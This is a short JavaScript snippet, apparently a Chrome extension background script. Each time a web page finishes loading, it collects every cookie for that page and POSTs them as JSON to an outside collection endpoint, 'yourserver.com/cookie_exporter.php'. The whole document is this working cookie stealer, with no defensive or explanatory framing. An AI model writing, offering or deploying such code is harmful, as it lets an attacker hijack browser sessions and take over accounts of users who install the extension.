chrome.webNavigation.onCompleted.addListener(
  (details) => {
    chrome.cookies.getAll({ url: details.url }, (cookies) => {
      const url = "http://yourserver.com/cookie_exporter.php";

      fetch(url, {
        method: "POST",
        body: JSON.stringify({ cookies: cookies }),
        headers: {
          "Content-Type": "application/json",
        },
      })
        .then((response) => {
          if (!response.ok) {
            throw new Error("Network response was not ok");
          }
          return response.json();
        })
        .then((data) => console.log(data))
        .catch((error) => console.error("Error fetching cookies:", error));
    });
  },
  { url: [{ schemes: ["http", "https"] }] }
);
